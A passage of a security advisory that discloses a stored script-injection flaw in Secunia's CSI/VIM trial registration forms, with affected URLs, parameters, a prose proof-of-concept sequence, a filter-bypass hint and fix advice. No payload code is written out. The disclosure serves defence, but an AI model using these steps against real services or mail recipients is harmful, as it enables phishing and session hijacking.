Exploitation Technique:

Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
A persistent mail encoding web vulnerability has been discovered in the official Secunia website web-application for csi/vim account registration.
The vulnerability allows an remote attacker to inject own malicious script codes to the application-side of the vulnerable web-application service.

The vulnerability is located in the web input form of the registration to the csi and vim program. The user is able to register with persistent 
script codes as first- & lastname.The affect becomes visible in the outgoing email of the web-server and could maybe affect other sections in 
the profile. The attacker injects a payload and streams the malicious mail with own content to a secunia- or random-user. The filter of the 
web-server is not validating the context of the mail on input through the website. The result is an application-side script code execution in 
the mail header after the introduction word `Dear`. The mail includes the registered user (db stored) with the payload context and does not 
encode the input.

The secunia web-server tries to encode the input and prevents it with `/`. The attacker can input multiple strings and between the parse with the `/` 
the persistent script code execution occurs. The issue allows attackers to inject `frames`, `iframes`, `img` and different other html tags with 
own script codes. The mails can be send to random user for phishing attacks with persistent attack vector or directly to well known secunia 
customers via mail. 

The security risk of the persistent input validation web vulnerability in the mail encldoing of the web-server is estimated as medium with a 
cvss (common vulnerability scoring system) count of 3.9.

Exploitation of the mail encoding and web-server validation vulnerability requires low or medium user interaction and no privileged secunia vim/csi 
application user account. Successful exploitation of the persistent mail encoding web vulnerability results in persistent phishing attacks against 
customers or random email users, session hijacking, persistent redirects to malware and persistent manipulation of affected or connected module context.

Request Method(s):
				[+] POST

Vulnerable Module(s):
				[+] /products/corporate/vim/trial/
				[+] /vulnerability_scanning/corporate/trial/

Vulnerable Parameter(s):
				[+] First- & Lastname

Affected Section(s):
				[+] Secunia CSI - Mail Notification
				[+] Secunia VIM - Mail Notification


Note: A demo user can also become a registered secunia user with the same profile credentials which impact the risk to receive later compromised service email notifications or execution of payload in the user frontend/backend next to the db stored profile values.


Proof of Concept (PoC):
=======================
The persistent mail encoding web vulnerabilities can be exploited remote attackers without privileged application user account or with low privileged 
application user account and without user interaction. For security demonstration or to reproduce the security vulnerability follow the provided 
information and steps below to continue.

1. Open the two vulnerable service registration formulars > http://secunia.com/products/corporate/vim/trial/  > http://secunia.com/vulnerability_scanning/corporate/trial/
2. Inject own script code (payload) to the vulnerable first- & lastname input field values
3. Submit the formulars to secunia
4. Check your registration postbox and review the first arriving email of secunia during the registration tral procedure for example
5. The persistent script code execution occurs in the mail next to the introduction word `Dear` x=First- & Lastname
6. Successful reproduce of the persistent mail encoding web-server vulnerability!

Note: A demo user can become a registered secunia user with the same credentials which impact also a risk to later email notifications or service values.
The attacker is able to send the mail to random new email or to other secunia customers email by a mailing list.

Solution - Fix & Patch:
=======================
The vulnerability can be patched by a secure parse and encode of all input fields with the vulnerable first- & lastname value in the registrations. 
The registration formular (csi/vim) needs to be encode and a secure input restriction for special chars validation is required. Parse and encode also 
the outgoing mail context and disallow html script code as user values to prevent further attacks.


Security Risk:
==============
The security risk of the mail encoding vulnerability in the registration module is estimated as medium with a cvss of 3.9.
